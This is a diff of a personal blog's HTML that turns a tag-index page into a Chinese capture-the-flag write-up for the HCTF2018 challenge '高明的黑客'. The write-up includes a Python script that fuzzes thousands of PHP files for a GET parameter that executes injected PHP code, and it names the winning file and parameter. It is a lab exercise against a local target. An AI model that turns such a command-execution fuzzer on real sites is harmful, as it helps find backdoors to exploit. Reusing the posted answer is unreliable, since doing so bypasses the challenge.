@@ -118,21 +118,25 @@
 
 
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://frystal.github.io/tags/index.html">
+  <meta name="description" content="HCTF2018">
+<meta name="keywords" content="buuoj">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高明的黑客">
+<meta property="og:url" content="http://frystal.github.io/2019/08/25/高明的黑客/index.html">
 <meta property="og:site_name" content="Frystal&#39;s blog">
+<meta property="og:description" content="HCTF2018">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-12T04:48:24.936Z">
+<meta property="og:updated_time" content="2019-09-22T02:30:57.262Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
+<meta name="twitter:title" content="高明的黑客">
+<meta name="twitter:description" content="HCTF2018">
 
 
 
 
 
 
-  <link rel="canonical" href="http://frystal.github.io/tags/">
+  <link rel="canonical" href="http://frystal.github.io/2019/08/25/高明的黑客/">
 
 
 
@@ -142,7 +146,7 @@
   };
 </script>
 
-  <title>tags | Frystal's blog</title>
+  <title>高明的黑客 | Frystal's blog</title>
   
 
 
@@ -245,7 +249,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
 
     
     
@@ -301,25 +305,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -346,64 +331,181 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://frystal.github.io/2019/08/25/高明的黑客/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="frystal">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frystal's blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-<h1 class="post-title" itemprop="name headline">tags</h1>
-
-<div class="post-meta">
-  
-  
-
-
-
-</div>
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                
-                
-                  
-                    
-                  
-                
-                  
-                    
-                  
-                
-                  
-                    
-                  
-                
-                目前共计 3 个标签
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/HTB/" style="font-size: 30px; color: #111">HTB</a> <a href="/tags/buuoj/" style="font-size: 36px; color: #111">buuoj</a> <a href="/tags/test/" style="font-size: 24px; color: #111">test</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">高明的黑客
+              
+            
+          </h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-25 10:17:16" itemprop="dateCreated datePublished" datetime="2019-08-25T10:17:16+08:00">2019-08-25</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-22 10:30:57" itemprop="dateModified" datetime="2019-09-22T10:30:57+08:00">2019-09-22</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>HCTF2018<br><a id="more"></a><br>一开始就给了源码40M的压缩包,几千个php<br>一开始以为是要找正确的php,找了一会没找到.<br>给的php里面也有执行,上传估计就是fuzz找正确的命令执行点了.<br>用python找到get和post传命令,看那个正确回显了.<br>这里就贴师傅的脚本了,(自己写了100多行的多进程,跑了半个小时还没出来,师傅20行8分钟)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">flies = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">    f = open(<span class="string">'/var/www/html/src/'</span>+i)</span><br><span class="line">    bb = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    rr = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">    aa = rr.findall(bb)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> aa:</span><br><span class="line">        payload = url + <span class="string">'/?'</span> + c + <span class="string">'=echo "get it";'</span></span><br><span class="line">        </span><br><span class="line">        req=requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'get it'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            print payload</span><br><span class="line">            <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure></p>
+<p>最后是xk0SzyKwfzw.php的get参数Efa5BVG</p>
+
       
     </div>
-    
-
-
 
     
+
     
     
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/buuoj/" rel="tag"><i class="fa fa-tag"></i> buuoj</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/22/Pythonnginx/" rel="next" title="Pythonnginx">
+                <i class="fa fa-chevron-left"></i> Pythonnginx
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
   </div>
 
 
